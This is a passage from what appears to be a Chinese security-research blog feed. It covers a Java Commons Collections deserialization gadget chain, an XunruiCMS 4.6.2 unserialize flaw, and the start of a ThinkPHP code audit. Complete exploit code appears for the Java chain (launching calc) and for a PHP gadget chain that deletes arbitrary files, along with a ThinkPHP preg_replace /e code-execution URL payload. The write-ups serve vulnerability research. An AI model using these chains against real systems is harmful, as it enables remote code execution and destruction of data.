ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);        field.setAccessible(true);        field.set(transformerChain,transformers);        serialize(hashtable);        unserialize(&quot;ser.bin&quot;);</code></pre><p>然后执行不成功，调试发现是因为<code>m.size() != size()</code>为true,</p><pre><code class="java">public boolean equals(Object o) &#123;    if (o == this)        return true;    if (!(o instanceof Map))        return false;    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;    if (m.size() != size())        return false;</code></pre><p>原因是反序列化前，运行到LazyMap的get()方法中，执行完<code>transform</code>往下，<code>map.put(key, value)</code>这里给map添加了键值对使得size变大了</p><pre><code class="java">public Object get(Object key) &#123;        // create value for key if key is not currently in the map        if (map.containsKey(key) == false) &#123;            Object value = factory.transform(key);            map.put(key, value);            return value;        &#125;        return map.get(key);    &#125;</code></pre><p>经过调试发现key是”yy”,所以要删除掉</p><pre><code class="java">Transformer transformerChain = new ChainedTransformer(fakeTransformers);Map hashMap1 = new HashMap();Map hashMap2 = new HashMap();Map lazyMap1 = LazyMap.decorate(hashMap1, transformerChain);lazyMap1.put(&quot;yy&quot;, 1);Map lazyMap2 = LazyMap.decorate(hashMap2, transformerChain);lazyMap2.put(&quot;zZ&quot;, 1);Hashtable hashtable = new Hashtable();hashtable.put(lazyMap1, 1);hashtable.put(lazyMap2, 1);Field field = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);field.setAccessible(true);field.set(transformerChain,transformers);lazyMap2.remove(&quot;yy&quot;);serialize(hashtable);unserialize(&quot;ser.bin&quot;);</code></pre><p>利用链如下</p><pre class="mermaid">graph TBA("java.util.Hashtable#\nreadObject()")-->B("java.util.Hashtable#\nreconstitutionPut()")-->C("java.util.AbstractMap#\nequals()")-->D("org.apache.commons.collections.map.LazyMap#\nget()")-->E("org.apache.commons.collections.functors.ChainedTransformer#\ntransform()")-->F("org.apache.commons.collections.functors.InvokerTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()")-->G("Runtime.getRuntime.exec")</pre><p>完整代码：</p><pre><code class="java">package org.example;import java.io.*;import java.lang.reflect.*;import java.util.HashMap;import java.util.Hashtable;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;public class App&#123;    public static void main(String[] args) throws ClassNotFoundException, IOException, IllegalAccessException, NoSuchFieldException &#123;        Transformer[] fakeTransformers = new Transformer[] &#123;&#125;;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        Transformer transformerChain = new ChainedTransformer(fakeTransformers);        Map hashMap1 = new HashMap();        Map hashMap2 = new HashMap();        Map lazyMap1 = LazyMap.decorate(hashMap1, transformerChain);        lazyMap1.put(&quot;yy&quot;, 1);        Map lazyMap2 = LazyMap.decorate(hashMap2, transformerChain);        lazyMap2.put(&quot;zZ&quot;, 1);        Hashtable hashtable = new Hashtable();        hashtable.put(lazyMap1, 1);        hashtable.put(lazyMap2, 1);        Field field = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);        field.setAccessible(true);        field.set(transformerChain,transformers);        lazyMap2.remove(&quot;yy&quot;);        serialize(hashtable);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/CC.svg" alt="CC"></p><p>五大反序列化利用基类：</p><blockquote><p>1.AnnotationInvocationHandler：反序列化的时候会循环调用成员变量的get方法，用来和lazyMap配合使用。</p><p>2.PriorityQueue：反序列化的时候会调用TransformingComparator中的transformer的transform方法，用来直接和Transformer配合使用。</p><p>3.BadAttributeValueExpException：反序列化的时候会去调用成员变量val的toString函数，用来和TiedMapEntry配合使用。（TiedMapEntry的toString函数会再去调自身的getValue）。</p><p>4.HashSet：反序列化的时候会去循环调用自身map中的put方法，用来和HashMap配合使用。</p><p>5.Hashtable：当里面包含2个及以上的map的时候，回去循环调用map的get方法，用来和LazyMap配合使用。</p></blockquote><p>四大Transformer的transform：</p><blockquote><p>1.ChainedTransformer：循环调用成员变量iTransformers数组中的tranform方法。</p><p>2.InvokerTransformer： 通过反射的方法调用传入transform方法中的input对象的方法（方法通过成员变量iMethodName设置，参数通过成员变量iParamTypes设置）</p><p>3.ConstantTransformer：返回成员变量iConstant的值。</p><p>4.InstantiateTransformer：通过反射的方法返回传入参数input的实例。（构造函数的参数通过成员变量iArgs传入，参数类型通过成员变量iParamTypes传入）</p></blockquote><p>三大Map：</p><blockquote><p>1.LazyMap：通过调用LazyMap的get方法可以触发它的成员变量factory的tranform方法，用来和上一节中的Tranformer配合使用。</p><p>2.TiedMapEntry：通过调用TiedMapEntry的getValue方法实现对他的成员变量map的get方法的调用，用来和LazyMap配合使用。</p><p>3.HashMap：通过调用HashMap的put方法实现对成员变量hashCode方法的调用，用来和TiedMapEntry配合使用（TiedMapEntry的hashCode函数会再去调自身的getValue）。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>迅睿CMS反序列化漏洞</title>
      <link href="/2023/07/13/%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/07/13/%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="迅睿CMS反序列化漏洞"><a href="#迅睿CMS反序列化漏洞" class="headerlink" title="迅睿CMS反序列化漏洞"></a>迅睿CMS反序列化漏洞</h1><p>测试环境：V 4.6.2 ，目前最新版</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><pre><code>\xunruicms\dayrui\Fcms\Core\Helper.php</code></pre><pre><code class="php">function dr_string2array($data, $limit = &#39;&#39;) &#123;    if (!$data) &#123;        return [];    &#125; elseif (is_array($data)) &#123;        $rt = $data;    &#125; else &#123;        $rt = json_decode($data, true);        if (!$rt) &#123;            $rt = unserialize(stripslashes($data));        &#125;    &#125;    if (is_array($rt) &amp;&amp; $limit) &#123;        return dr_arraycut($rt, $limit);    &#125;    return $rt;&#125;</code></pre><p>这里的<strong>unserialize</strong>函数里面存在一个<code>stripslashes</code>函数，这个可以绕过，只有将$data中的<code>\</code>修改为<code>\\</code>即可,在此之前，需要解决</p><p><code>json_decode</code>的问题，正常的json字符串会被解析，然后返回解析的值，如果传入的是不正常的字符串，它会解析失败，返回false，然后才能进入<code>unserialize</code></p><p>在这个过程中，$data并没有其他过多的检查，从而造成了反序列化漏洞</p><h2 id="传参入口寻找"><a href="#传参入口寻找" class="headerlink" title="传参入口寻找"></a>传参入口寻找</h2><p>为了能够利用这个unserialize函数，必须找到$data的输入点，ALT+F7搜索<code>dr_string2array</code>函数,找到了许多结果</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230712092809189.png" alt="image-20230712092809189"></p><p>找了很多,发现只有这个函数操作性比较强，其他的调用有许多是不可控的，或者是过滤</p><pre><code>xunruicms\dayrui\Fcms\Control\Admin\Field.php</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230712093851847.png" alt="image-20230712093851847"></p><p>看看这个<code>import_add</code>方法</p><p>首先，先判断是不是post请求，进入if语句，然后接收一个post参数code ， 然后通过<code>\r\n</code>对字符串进行分割，变为数组</p><p>如果post的code有数值，就不会进入if(!$arr),  绕后就遍历这个数组，把数组中的每一个数值都传到<code>dr_string2array</code>中，然后就是触发反序列化</p><p>下一个问题，如何才能进入这个<code>import_add</code>函数呢</p><p>在路由解析的过程中会接收两个参数，<code>c</code>和<code>m</code>    其中c获取的是类名，m获取的是方法名 ，获取之后会调用对应方法</p><p>尝试访问</p><pre><code>http://127.0.0.1/?c=field&amp;m=import_add</code></pre><p>出现404</p><p>观察一下目录，因为这个field类在Admin目录里面的,可能要访问admin.php</p><pre><code>http://127.0.0.1/admin3a609e1d6cff.php?c=field&amp;m=import_add</code></pre><p>在没有登录的情况下，会跳转到登录入口，所以要先登录管理员账号，可以通过下断点查看有没有执行到import_add方法</p><pre><code>POST ?/admin3a609e1d6cff.php?c=field&amp;m=import_addcode = xxxx</code></pre><h2 id="利用链寻找"><a href="#利用链寻找" class="headerlink" title="利用链寻找"></a>利用链寻找</h2><p>第一步寻找**__destruct()**方法，只有5个，一个一个找</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230712102701002.png" alt="image-20230712102701002"></p><p>第一个</p><pre><code class="php">public function __destruct()    &#123;        if ($this-&gt;memcached instanceof Memcached) &#123;            $this-&gt;memcached-&gt;quit();        &#125; elseif ($this-&gt;memcached instanceof Memcache) &#123;            $this-&gt;memcached-&gt;close();        &#125;    &#125;</code></pre><p>这个<code>$this-&gt;memcached</code>可控，但是要是Memcached 或 Memcached的实例 ，操作空间不大 pass</p><p>第二个</p><pre><code class="php">public function __destruct()    &#123;        if (is_resource($this-&gt;SMTPConnect)) &#123;            try &#123;                $this-&gt;sendCommand(&#39;quit&#39;);            &#125; catch (ErrorException $e) &#123;                $protocol = $this-&gt;getProtocol();                $method   = &#39;sendWith&#39; . ucfirst($protocol);                log_message(&#39;error&#39;, &#39;Email: &#39; . $method . &#39; throwed &#39; . $e);            &#125;        &#125;    &#125;</code></pre><p><code>$this-&gt;SMTPConnect</code>可控，但是要是一个资源类型，后面进入<code>sendCommand</code>方法，里面操作空间不大 pass</p><p>第三个</p><pre><code class="php">public function __destruct()    &#123;        if (isset($this-&gt;scratch)) &#123;            self::wipeDirectory($this-&gt;scratch);            $this-&gt;scratch = null;        &#125;    &#125;</code></pre><p>这个会调用<code>self::wipeDirectory</code> ,$this-&gt;scratch可控，跟进查看</p><pre><code class="php">private static function wipeDirectory(string $directory): void    &#123;        if (is_dir($directory)) &#123;            // Try a few times in case of lingering locks            $attempts = 10;            while ((bool) $attempts &amp;&amp; ! delete_files($directory, true, false, true)) &#123;                // @codeCoverageIgnoreStart                $attempts--;                usleep(100000); // .1s                // @codeCoverageIgnoreEnd            &#125;            @rmdir($directory);        &#125;    &#125;</code></pre><p>这里调用了<code>delete_files</code>似乎可以进行文件删除，继续跟进<code>delete_files</code>  </p><pre><code class="php">//\xunruicms\dayrui\CodeIgniter\System\Helpers\filesystem_helper.phpfunction delete_files(string $path, bool $delDir = false, bool $htdocs = false, bool $hidden = false): bool    &#123;        $path = realpath($path) ?: $path;        $path = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;        try &#123;            foreach (new RecursiveIteratorIterator(                new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),                RecursiveIteratorIterator::CHILD_FIRST            ) as $object) &#123;                $filename = $object-&gt;getFilename();                if (! $hidden &amp;&amp; $filename[0] === &#39;.&#39;) &#123;                    continue;                &#125;                if (! $htdocs || ! preg_match(&#39;/^(\.htaccess|index\.(html|htm|php)|web\.config)$/i&#39;, $filename)) &#123;                    $isDir = $object-&gt;isDir();                    if ($isDir &amp;&amp; $delDir) &#123;                        rmdir($object-&gt;getPathname());                        continue;                    &#125;                    if (! $isDir) &#123;                        unlink($object-&gt;getPathname());                    &#125;                &#125;            &#125;            return true;        &#125; catch (Throwable $e) &#123;            return false;        &#125;    &#125;</code></pre><ol><li><p>首先，使用 <code>realpath($path) ?: $path</code> 将传入的 <code>$path</code> 转换为绝对路径，如果转换失败，则保留原始路径。</p></li><li><p>然后，使用 <code>rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR</code> 将路径末尾的目录分隔符删除，并在末尾添加一个目录分隔符。</p></li><li><p>接下来，使用<code>RecursiveDirectoryIterator</code></p><p>类和<code>RecursiveIteratorIterator</code></p><p>类遍历指定路径下的所有文件和目录。</p><ul><li><code>RecursiveDirectoryIterator</code> 用于递归地遍历目录，并跳过 “.” 和 “..” 目录。</li><li><code>RecursiveIteratorIterator</code> 使用 <code>CHILD_FIRST</code> 模式，确保先处理子目录中的文件和目录，然后再处理父目录中的文件和目录。</li></ul></li><li><p>对于遍历到的每个文件或目录<code>$object</code>执行以下操作：</p><ul><li>获取文件名 <code>$filename = $object-&gt;getFilename()</code>。</li><li>如果 <code>$hidden</code> 为 <code>false</code>，并且文件名以 <code>.</code> 开头，则跳过当前循环，不处理该文件。</li><li>如果 <code>$htdocs</code> 为 <code>true</code>，并且文件名匹配 <code>.htaccess</code>、<code>index.html</code>、<code>index.htm</code>、<code>index.php</code> 和 <code>web.config</code> 则跳过当前循环，不处理该文件。</li><li>检查文件类型：<ul><li>如果是目录且 <code>$delDir</code> 为 <code>true</code>，则使用 <code>rmdir($object-&gt;getPathname())</code> 删除目录，并继续下一次循环。</li><li>如果不是目录，则使用 <code>unlink($object-&gt;getPathname())</code> 删除文件。</li></ul></li></ul></li><li><p>循环结束后，返回 <code>true</code> 表示删除操作成功。</p></li><li><p>如果在删除过程中发生任何异常（<code>Throwable</code>），则捕获异常，并返回 <code>false</code> 表示删除操作失败。</p></li></ol><p>写poc试了一下，发现没有在<code>wipeDirectory</code>中没有进入<code>delete_files</code>中，报错了，函数导向错误</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230712111020382.png" alt="image-20230712111020382"></p><p>因为<code>delete_files</code>并不存在于某个类里面，只是一个函数，要利用这个方法需要引用它所在的文件，利用的类里面已经引用了这个文件，就是不跳转TT^TT</p><p>第四个</p><pre><code class="php">public function __destruct()    &#123;        unset($this-&gt;data);        unset($this-&gt;cache);        unset($this-&gt;ret);        unset($this-&gt;icon);        unset($this-&gt;result_array);        unset($this-&gt;nbsp_str);        unset($this-&gt;nbsp);        unset($this-&gt;result);    &#125;</code></pre><p>这个只是用来释放变量，没操作空间 ，pass</p><p>第五个</p><pre><code class="php">public function __destruct()    &#123;        if (isset($this-&gt;redis)) &#123;            $this-&gt;redis-&gt;close();        &#125;    &#125;</code></pre><p>这个<code>$this-&gt;redis</code>可控，这里有两个方向，一个触发某个类的**__call()** , 另外一个是找到一个含有**close()**方法的类</p><p>经过一番查找，没有找到能利用的**__call()** ，只好去看看close()了</p><p>全局搜索close()方法找到了15个方法，其中有7个是js文件的，忽略</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230712114207860.png" alt="image-20230712114207860"></p><p>经过一番查找，找到这个可以用</p><pre><code class="php">//\xunruicms\dayrui\CodeIgniter\System\Session\Handlers\MemcachedHandler.phppublic function close(): bool    &#123;        if (isset($this-&gt;memcached)) &#123;            if (isset($this-&gt;lockKey)) &#123;                $this-&gt;memcached-&gt;delete($this-&gt;lockKey);            &#125;            if (! $this-&gt;memcached-&gt;quit()) &#123;                return false;            &#125;            $this-&gt;memcached = null;            return true;        &#125;        return false;    &#125;</code></pre><p>这里的<code>$this-&gt;memcached</code>和<code>$this-&gt;lockKey</code>都可控，这里也可以触发任意类的**__call**方法，也可以触发任意类的<code>delete()</code>和<code>quit()</code>方法</p><p>这里优先选择<code>delete()</code> ,因为其参数<code>$this-&gt;lockKey</code>可控</p><p>全局搜索<code>delete()</code>方法,找到这个</p><pre><code class="php">public function delete() &#123;        @unlink($this-&gt;fullname);    &#125;</code></pre><p><code>$this-&gt;fullname</code>可控，这里可以任意文件删除了，但是这是无参数方法，不能跳转到这利用</p><p>还一个：</p><pre><code class="php">//\xunruicms\dayrui\CodeIgniter\System\Cache\Handlers\FileHandler.phppublic function delete(string $key)    &#123;        $key = static::validateKey($key, $this-&gt;prefix);        return is_file($this-&gt;path . $key) &amp;&amp; unlink($this-&gt;path . $key);    &#125;</code></pre><p>其中$key是上面传来的参数<code>$this-&gt;lockKey</code> 并且<code>$this-&gt;prefix</code>和<code>$this-&gt;path</code>也可控 ，可以看到后面会将<code>$this-&gt;path</code>和<code>$key</code>进行拼接，进行判断是否是文件，如果是文件则调用<code>unlink</code>方法进行文件删除</p><p>现在主要关注<code>validateKey</code>方法对$key的处理</p><pre><code class="php">public static function validateKey($key, $prefix = &#39;&#39;): string    &#123;        if (! is_string($key)) &#123;            throw new InvalidArgumentException(&#39;Cache key must be a string&#39;);        &#125;        if ($key === &#39;&#39;) &#123;            throw new InvalidArgumentException(&#39;Cache key cannot be empty.&#39;);        &#125;        $reserved = config(&#39;Cache&#39;)-&gt;reservedCharacters ?? self::RESERVED_CHARACTERS;        if ($reserved &amp;&amp; strpbrk($key, $reserved) !== false) &#123;            throw new InvalidArgumentException(&#39;Cache key contains reserved characters &#39; . $reserved);        &#125;        // If the key with prefix exceeds the length then return the hashed version        return strlen($prefix . $key) &gt; static::MAX_KEY_LENGTH ? $prefix . md5($key) : $prefix . $key;    &#125;</code></pre><p>这个方法，在确保传入的$key不为空，并且是字符串的前提下，才能正常进行下面操作</p><pre><code>$reserved = config(&#39;Cache&#39;)-&gt;reservedCharacters ?? self::RESERVED_CHARACTERS;</code></pre><p>获取配置中的保留字符列表。如果 <code>config(&#39;Cache&#39;)-&gt;reservedCharacters</code> 存在，则将其赋值给 <code>$reserved</code>；否则，使用 <code>self::RESERVED_CHARACTERS</code> 的默认值。</p><pre><code class="php">public string $reservedCharacters = &#39;&#123;&#125;()/\@:&#39;;</code></pre><pre><code class="php">return strlen($prefix . $key) &gt; static::MAX_KEY_LENGTH ? $prefix . md5($key) : $prefix . $key;</code></pre><ul><li>首先，计算添加前缀后键的长度是否大于预定义的最大键长度 <code>static::MAX_KEY_LENGTH</code>。</li><li>如果大于最大键长度，则返回将 <code>$prefix . md5($key)</code> 处理后的哈希值作为缓存键。这是为了确保最终返回的键不会超过最大键长度。</li><li>如果小于等于最大键长度，则返回将 <code>$prefix . $key</code> 拼接作为缓存键</li></ul><p>经过测试，在delete方法中，如果传入<code>$key</code>为要删除的文件名，在经过<code>validateKey</code>处理后，不会对key照常改变，直接返回<code>key</code>,而<code>$this-&gt;prefix</code>不需要修改，默认就行</p><p>在拼接文件路径的<code>$this-&gt;path</code> 可以是绝对路径，也可以是相对路径，默认是public目录下</p><p>在写exp的过程中，遇到一个问题，就是类的属性都是<strong>protected</strong>类型的，不能直接修改值</p><p>因为这个cms安装条件是PHP7.4+   , 由于<strong>PHP7.1+<strong>对属性类型不敏感 ， 可以将<code>protected</code>修改为</strong>public</strong>类型</p><p>最后的exp</p><pre><code class="php">//任意文件删除&lt;?phpnamespace CodeIgniter\Cache\Handlers;use CodeIgniter\Session\Handlers\BaseHandler;use CodeIgniter\Session\Handlers\MemcachedHandler;class RedisHandler extends BaseHandler&#123;    public $redis;    public function __construct()    &#123;        $this-&gt;redis =new MemcachedHandler();    &#125;&#125;namespace CodeIgniter\Session\Handlers;use CodeIgniter\Session\Handlers\BaseHandler;use CodeIgniter\Cache\Handlers\FileHandler;class MemcachedHandler extends BaseHandler&#123;    public $memcached ;    public $lockKey ;    public function __construct()    &#123;        $this-&gt;memcached=new FileHandler();        $this-&gt;lockKey = &quot;1.txt&quot;; //文件名    &#125;&#125;namespace CodeIgniter\Session\Handlers;abstract class BaseHandler&#123;&#125;namespace CodeIgniter\Cache\Handlers;use CodeIgniter\Session\Handlers\BaseHandler;class FileHandler extends BaseHandler&#123;    public $path;    public function __construct()    &#123;        $this-&gt;path=&quot;./&quot;; //路径    &#125;&#125;use CodeIgniter\Cache\Handlers\RedisHandler;$str =  serialize(new RedisHandler());$newStr = str_replace(&#39;\\&#39;, &#39;\\\\&#39;, $str);echo urlencode($newStr).&quot;\n&quot;;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 代码审计</title>
      <link href="/2023/07/08/ThinkPHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2023/07/08/ThinkPHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP代码审计"><a href="#ThinkPHP代码审计" class="headerlink" title="ThinkPHP代码审计"></a>ThinkPHP代码审计</h1><p><img src="https://image.3001.net/images/20200908/1599567391.png" alt="img"></p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>URL和路由：<a href="https://blog.csdn.net/lthirdonel/article/details/88775620">https://blog.csdn.net/lthirdonel/article/details/88775620</a></p><p>thinkphp内置了几种方法，在<code>ThinkPHP/Common/functions.php</code>，比如I()，M()等等</p><pre><code>A 快速实例化Action类库 B 执行行为类 C 配置参数存取方法 D 快速实例化Model类库 F 快速简单文本数据存取方法 I http获取参数L 语言参数存取方法 M 快速高性能实例化模型 R 快速远程调用Action类方法 S 快速缓存存取方法 U URL动态生成和重定向方法 W 快速Widget输出方法</code></pre><h2 id="ThinkPHP-2-x"><a href="#ThinkPHP-2-x" class="headerlink" title="ThinkPHP 2.x"></a>ThinkPHP 2.x</h2><h3 id="preg-replace-x2F-e模式代码执行漏洞"><a href="#preg-replace-x2F-e模式代码执行漏洞" class="headerlink" title="preg_replace &#x2F;e模式代码执行漏洞"></a>preg_replace &#x2F;e模式代码执行漏洞</h3><p><a href="https://blog.csdn.net/weixin_43749601/article/details/113417093">https://blog.csdn.net/weixin_43749601/article/details/113417093</a></p><p>在2.1版本中存在大量preg_replace()函数使用了<code>/e</code>模式，如果参数可控，有可能存在任意代码执行漏洞（php&lt;7）</p><p>下面的<code>@e</code>和<code>/e</code>是一样的</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703120726229.png" alt="image-20230703120726229"></p><p>在<code>ThinkPHP/Lib/Think/Util/Dispatcher.class.php</code>中，Dispatcher类的dispatch方法里</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703121414905.png" alt="image-20230703121414905"></p><p><code>Dispatcher.class.php</code> 文件负责接收用户发送的请求，并根据路由规则将请求分发到相应的控制器（Controller）和方法（Action）。它会解析 URL，并根据定义的路由规则进行匹配，然后确定要执行的控制器和方法。</p><p>根据ThinkPHP对路由的解析，对这部分代码进行调试和分析</p><pre><code>http://xx.xx.xx.xx/index.php/模块/控制器/操作http://127.0.0.1/index.php/a/b/c/d</code></pre><p>首先，通过 <code>C(&#39;URL_MODEL&#39;)</code> 获取 URL 的模式，然后根据不同的模式进行不同的处理，这里是默认模式</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703141034997.png" alt="image-20230703141034997"></p><p>接下来，如果配置文件中开启了子域名部署（<code>APP_SUB_DOMAIN_DEPLOY</code> 为真），则会根据规则对子域名进行路由处理。这里为false，直接跳过了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703141414294.png" alt="image-20230703141414294"></p><p>然后根据配置文件中的设置获取 URL 的分隔符 (<code>URL_PATHINFO_DEPR</code>)，并调用 <code>getPathInfo()</code> 函数来分析 URL 的 PATHINFO 信息</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703141608989.png" alt="image-20230703141608989"></p><p>接下来是路由检测和解析的部分。首先会调用 <code>routerCheck()</code> 函数检测是否有自定义的路由规则。如果没有自定义的路由规则，则按照默认规则进行调度。它会先根据 URL 分隔符将 <code>$_SERVER[&#39;PATH_INFO&#39;]</code> 进行切割，得到一个路径的数组 <code>$paths</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703141759745.png" alt="image-20230703141759745"></p><p>然后到preg_replace函数</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703141926792.png" alt="image-20230703141926792"></p><p>在<code>preg_replace()</code>函数中，正则表达式中使用了&#x2F;e模式，将“替换字符串”作为PHP代码求值，并用其结果来替换所搜索的字符串</p><p>上面正则表达式可以简化为<code>\w+/([\^\/])</code>，即搜索获取“&#x2F;”前后的两个参数，$var[‘\1’]&#x3D;”\2”;是对数组的操作，将之前搜索到的第一个值作为新数组的键，将第二个值作为新数组的值，我们发现可以构造搜索到的第二个值，即可执行任意PHP代码</p><pre><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode($depr,$paths));$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, &#39;c/d&#39;);</code></pre><p>在PHP当中，${}是可以构造一个变量的，{}写的是一般的字符，那么就会被当成变量，比如${a}等价于$a，那如果{}写的是一个已知函数名称呢？那么这个函数就会被执行</p><p>所以只要构造成这样：</p><pre><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, &#39;c/$&#123;phpinfo()&#125;&#39;);</code></pre><p>访问：<code>http://127.0.0.1/index.php/a/b/c/$&#123;phpinfo()&#125;</code>出现报错</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703143247858.png" alt="image-20230703143247858"></p><p>加上<code>@</code>进行错误抑制即可</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703143407449.png" alt="image-20230703143407449"></p><p>后面版本的更新中，<code>preg_replace</code>被替换了：</p><p>输入的${phpinfo()}被当成了字符串被strip_tags()处理了</p><pre><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=strip_tags(\&#39;\\2\&#39;);&#39;, implode($depr,$paths));</code></pre><h2 id="ThinkPHP-3-x"><a href="#ThinkPHP-3-x" class="headerlink" title="ThinkPHP 3.x"></a>ThinkPHP 3.x</h2><h3 id="3-2-3-where-注入"><a href="#3-2-3-where-注入" class="headerlink" title="3.2.3 where 注入"></a>3.2.3 where 注入</h3><p>配置控制器和数据库</p><p><code>Application/Home/Controller/IndexController.class.php</code></p><pre><code class="php">public function index()&#123;$data = M(&#39;users&#39;)-&gt;find(I(&#39;GET.id&#39;));var_dump($data);&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703174513551.png" alt="image-20230703174513551"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703174604563.png" alt="image-20230703174604563"></p><p>访问测试：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703174640702.png" alt="image-20230703174640702"></p><p>对传入<code>id=1</code>，跟着调试看看</p><pre><code class="php">public function index()    &#123;        $data = M(&#39;users&#39;)-&gt;find(I(&#39;GET.id&#39;));        var_dump($data);    &#125;</code></pre><p>首先调用了M()方法,大概就是连接数据库，创建Model对象，位置在<code>ThinkPHP/Mode/Lite/Model.class.php</code></p><pre><code class="php">/** * 实例化一个没有模型文件的Model * @param string $name Model名称 支持指定基础模型 例如 MongoModel:User * @param string $tablePrefix 表前缀 * @param mixed $connection 数据库连接信息 * @return Think\Model */function M($name = &#39;&#39;, $tablePrefix = &#39;&#39;, $connection = &#39;&#39;)&#123;    static $_model = array();    if (strpos($name, &#39;:&#39;)) &#123;        list($class, $name) = explode(&#39;:&#39;, $name);    &#125; else &#123;        $class = &#39;Think\\Model&#39;;    &#125;    $guid = (is_array($connection) ? implode(&#39;&#39;, $connection) : $connection) . $tablePrefix . $name . &#39;_&#39; . $class;    if (!isset($_model[$guid])) &#123;        $_model[$guid] = new $class($name, $tablePrefix, $connection);    &#125;    return $_model[$guid];&#125;</code></pre><p>结束后调用I()方法，获取和解析http请求GET id的值，这里面调用了下面的方法进行安全过滤</p><pre><code class="php">function think_filter(&amp;$value)&#123;    // TODO 其他安全过滤    // 过滤查询特殊字符    if (preg_match(&#39;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#39;, $value)) &#123;        $value .= &#39; &#39;;    &#125;</code></pre><p>然后调用Model()类的find()方法，将传入的id做为参数，又会经过<code>ThinkPHP/Library/Think/Model.class.php</code>的 <code>_parseOptions()</code>方法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703200750666.png" alt="image-20230703200750666"></p><p>跟进这个方法：</p><p>里面存在字段类型验证</p><pre><code class="php">if (isset($options[&#39;where&#39;]) &amp;&amp; is_array($options[&#39;where&#39;]) &amp;&amp; !empty($fields) &amp;&amp; !isset($options[&#39;join&#39;])) &#123;            // 对数组查询条件进行字段类型检查            foreach ($options[&#39;where&#39;] as $key =&gt; $val) &#123;                $key = trim($key);                if (in_array($key, $fields, true)) &#123;                    if (is_scalar($val)) 